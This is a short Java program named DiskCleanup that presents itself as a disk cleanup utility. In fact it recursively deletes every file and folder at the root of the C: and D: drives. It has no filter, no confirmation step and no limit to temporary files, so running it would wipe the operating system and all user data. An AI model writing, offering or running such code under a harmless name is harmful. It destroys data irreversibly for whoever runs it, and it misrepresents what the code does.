import java.io.File;

public class DiskCleanup {
    public static void main(String[] args) {
        String cDrivePath = "C:\\";
        String dDrivePath = "D:\\";

        cleanupDrive(cDrivePath);
        cleanupDrive(dDrivePath);
    }

    private static void cleanupDrive(String drivePath) {
        File drive = new File(drivePath);
        if (drive.exists() && drive.isDirectory()) {
            File[] files = drive.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isFile()) {
                        file.delete();
                    } else if (file.isDirectory()) {
                        cleanupDirectory(file);
                        file.delete();
                    }
                }
            }
        }
    }

    private static void cleanupDirectory(File directory) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    file.delete();
                } else if (file.isDirectory()) {
                    cleanupDirectory(file);
                    file.delete();
                }
            }
        }
    }
}